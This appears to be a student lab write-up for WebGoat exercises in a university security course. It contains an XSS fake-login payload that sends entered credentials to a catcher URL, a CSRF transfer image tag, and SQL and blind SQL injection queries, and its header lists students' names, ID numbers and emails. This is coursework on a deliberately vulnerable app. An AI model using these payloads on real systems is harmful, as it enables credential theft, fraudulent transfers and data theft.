#Krishna Solanki, 1004275328, krishna.solanki@mail.utoronto.ca
#Wasif Zulkernine, 1004069376, wasif.zulkernine@mail.utoronto.ca 

Part 1 Explanation
The exploit involved injecting html and script in a unchecked search bar, which
created a fake login page. From there a user can be tricked into entering
their username and password. These details would be sent to a hackers server.

<script>
    function onSubmit() {
        const name = document.getElementById("ece568_2022s_user").value;
        const pass = document.getElementById("ece568_2022s_pw").value;
        
        const attackURL = `http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishingUsername=${name}&phishingPassword=${pass}`;

        window.location.replace(attackURL);
    }
</script>

<form>
    <br>
    Login Form
    <br>
	Enter Username:
	<input type="text" id = "ece568_2022s_user"><br>
	Enter password:
	<input type="text" id = "ece568_2022s_pw"><br>	
	<button id = "ece568_2022s_submit" onclick="onSubmit()">Login</button>
</form>

Part 3 Explanation
This exploit hides a url in an image which when the user loads, will lead to a 
transfer of their money. This happens because the user is signed in and the changing
of the transfer field to an amount - initiates a transfer of that amount.

<img src = "http://localhost:8090/WebGoat/attack?Screen=1430709817&menu=900&transfer=5000">

Part 4 Explanation

Inserted 2 iframes, which are responsible for exploiting the unchecked transfer field in the src attribute to hack the user into navigating to the link for transfering funds.  

Part 5 Explanation
This exploit uses an iframe to initiate a transfer. From there, we read the token value which is hidden (found by
inspecting the element). From there we can construct the final url using the token to authorize the transfer. We
then replace the current page url with the final url.

Part 6 Explanation 

Exploited unchecked input to inject SQL statemement at the end of WHERE conditional which will always resolve to true, thereby retrieiving all records from the data base without specifying lastname.

Part 7 Explanation:
N/A

Part 8 Explanation:

101 
AND 
EXISTS (SELECT * FROM credit WHERE cc_number=1234123412341234 AND pin >= <guess>)

101 is always true and used to inject the real sql query above. Using guesses from 1
0->10000 for size, then giong digit by digit from the left by increasing and checking validity until finding 3318

